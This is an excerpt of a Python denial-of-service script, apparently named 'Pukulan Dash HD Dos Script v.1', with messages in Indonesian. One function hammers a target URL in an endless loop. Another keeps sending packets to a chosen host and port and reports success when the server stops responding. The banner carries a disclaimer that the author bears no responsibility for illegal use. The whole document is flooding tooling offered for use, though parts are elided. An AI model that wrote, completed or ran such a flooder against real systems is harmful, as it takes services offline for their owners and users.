...
def bot_hammering(url):
	try:
		while True:
			...
			print("\033[94mDash HD mengelus target...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)
	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--Dash HD memukul target!--> \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mBerhenti<->:(\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91mServer tumbang! Dash HD berhasil\033[0m")
...
def usage():
	...
	//////       ///     ________   |||     |||  |||     ||| //////
        ...
        ///  // //     //            |  |||     |||  |||     ||| ///  //
        ////// //     //    _________|  |||     |||  |||     ||| /////
	Pukulan Dash HD Dos Script v.1
	Pembuat tidak bertanggung jawab jika digunakan untuk melawan hukum.
	Pembuat tidak bertanggung jawab jika Subcriber Dash hd menurun :).
